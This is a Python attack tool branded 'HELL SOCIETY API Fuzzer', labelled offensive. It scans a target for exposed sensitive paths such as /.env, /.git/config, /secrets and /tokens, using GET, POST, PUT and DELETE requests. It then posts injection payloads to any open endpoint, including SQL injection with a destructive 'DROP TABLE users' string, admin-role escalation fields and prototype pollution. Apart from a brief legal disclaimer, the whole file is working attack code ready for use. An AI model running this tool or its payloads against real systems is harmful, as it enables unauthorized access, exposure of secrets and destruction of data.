#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  API FUZZER v2.0                                                 ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - API Pentesting                            ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import colorama
from colorama import Fore, Back, Style
import argparse
import json
import time

colorama.init(autoreset=True)

BANNER = f"""
{Fore.GREEN}╔══════════════════════════════════════════════════════════════════╗
║{Fore.CYAN}    █████╗ ██████╗ ███╗   ██╗███████╗██╗      ██████╗ ████████╗    {Fore.GREEN}║
║{Fore.CYAN}   ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║     ██╔═══██╗╚══██╔══╝    {Fore.GREEN}║
║{Fore.CYAN}   ███████║██████╔╝██╔██╗ ██║█████╗  ██║     ██║   ██║   ██║       {Fore.GREEN}║
║{Fore.CYAN}   ██╔══██║██╔══██╗██║╚██╗██║██╔══╝  ██║     ██║   ██║   ██║       {Fore.GREEN}║
║{Fore.CYAN}   ██║  ██║██║  ██║██║ ╚████║███████╗███████╗╚██████╔╝   ██║       {Fore.GREEN}║
║{Fore.CYAN}   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝    ╚═╝       {Fore.GREEN}║
╠══════════════════════════════════════════════════════════════════╣
║{Fore.YELLOW}  HELL SOCIETY - API Fuzzer v2.0                                      {Fore.GREEN}║
╚══════════════════════════════════════════════════════════════════╝
"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

API_ENDPOINTS = [
    '/api/v1/users', '/api/v2/users', '/api/users', '/users',
    '/api/v1/admin', '/api/v2/admin', '/api/admin', '/admin',
    '/api/v1/config', '/api/v2/config', '/api/config', '/config',
    '/api/v1/auth', '/api/v2/auth', '/api/auth', '/auth',
    '/api/v1/tokens', '/api/v2/tokens', '/api/tokens', '/tokens',
    '/api/v1/keys', '/api/v2/keys', '/api/keys', '/keys',
    '/api/v1/secrets', '/api/v2/secrets', '/api/secrets', '/secrets',
    '/api/v1/payments', '/api/v2/payments', '/api/payments', '/payments',
    '/api/v1/upload', '/api/v2/upload', '/api/upload', '/upload',
    '/api/v1/download', '/api/v2/download', '/api/download', '/download',
    '/api/v1/export', '/api/v2/export', '/api/export', '/export',
    '/api/v1/import', '/api/v2/import', '/api/import', '/import',
    '/api/v1/delete', '/api/v2/delete', '/api/delete', '/delete',
    '/.env', '/.git/config', '/swagger.json', '/api-docs',
    '/openapi.json', '/api/swagger', '/graphql',
]

FUZZ_PAYLOADS = [
    {"id": "1' OR '1'='1"},
    {"id": "' UNION SELECT * FROM users --"},
    {"id": "1; DROP TABLE users --"},
    {"role": "admin"},
    {"role": "superadmin"},
    {"isAdmin": True},
    {"is_admin": True},
    {"debug": True},
    {"verbose": True},
    {"test": True},
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
]

class APIFuzzer:
    def __init__(self, target, timeout=10):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.vulns = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })

    def fuzz_endpoints(self):
        print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{self.target}")
        print(f"{Fore.CYAN}  [*] Testing {len(API_ENDPOINTS)} endpoints...\n")

        for i, endpoint in enumerate(API_ENDPOINTS):
            progress = (i / len(API_ENDPOINTS)) * 100
            bar_length = 40
            filled = int(bar_length * i / len(API_ENDPOINTS))
            bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)
            print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% - Testing: {endpoint}", end="", flush=True)

            url = f"{self.target}{endpoint}"

            for method in ['GET', 'POST', 'PUT', 'DELETE']:
                try:
                    if method == 'GET':
                        resp = self.session.get(url, timeout=self.timeout)
                    else:
                        resp = self.session.request(method, url, json={}, timeout=self.timeout)

                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if isinstance(data, (list, dict)) and len(str(data)) > 50:
                                print(f"\n  {Fore.GREEN}[+] {method} {endpoint} - 200 OK")
                                print(f"  {Fore.GREEN}  Data: {str(data)[:100]}")
                                self.vulns.append(f"Exposed API: {method} {endpoint}")
                        except:
                            if len(resp.text) > 100:
                                print(f"\n  {Fore.YELLOW}[?] {method} {endpoint} - 200 OK (non-JSON)")

                    elif resp.status_code in [401, 403]:
                        print(f"\n  {Fore.YELLOW}[!] {method} {endpoint} - {resp.status_code} (Auth required)")

                except requests.exceptions.Timeout:
                    pass
                except requests.exceptions.RequestException:
                    pass

        self.fuzz_payloads()

    def fuzz_payloads(self):
        if not self.vulns:
            return

        print(f"\n\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  PAYLOAD TESTING")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        exposed = [v.split(': ')[1] if ': ' in v else v for v in self.vulns if 'Exposed API' in v]

        for endpoint_path in exposed[:5]:
            method = endpoint_path.split(' ')[0]
            path = endpoint_path.split(' ')[1]
            url = f"{self.target}{path}"

            for payload in FUZZ_PAYLOADS:
                try:
                    resp = self.session.post(url, json=payload, timeout=self.timeout)
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if isinstance(data, (list, dict)) and len(str(data)) > 100:
                                print(f"  {Fore.GREEN}[+] Payload accepted: {path} + {payload}")
                                self.vulns.append(f"Payload Injection: {path}")
                        except:
                            pass
                except:
                    pass

    def print_results(self):
        if not self.vulns:
            print(f"\n\n{Fore.YELLOW}  [!] No API vulnerabilities found")
            return

        print(f"\n\n{Fore.RED}{Back.BLACK}  FUZZING COMPLETE - {len(self.vulns)} FINDINGS  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        for i, v in enumerate(self.vulns, 1):
            print(f"  {Fore.RED}  [{i}] {v}")

def main():
    print(BANNER)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(description='Hell Society API Fuzzer')
    parser.add_argument('-u', '--url', required=True, help='Target API base URL')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout')
    args = parser.parse_args()

    fuzzer = APIFuzzer(args.url, args.timeout)
    fuzzer.fuzz_endpoints()
    fuzzer.print_results()

if __name__ == "__main__":
    main()
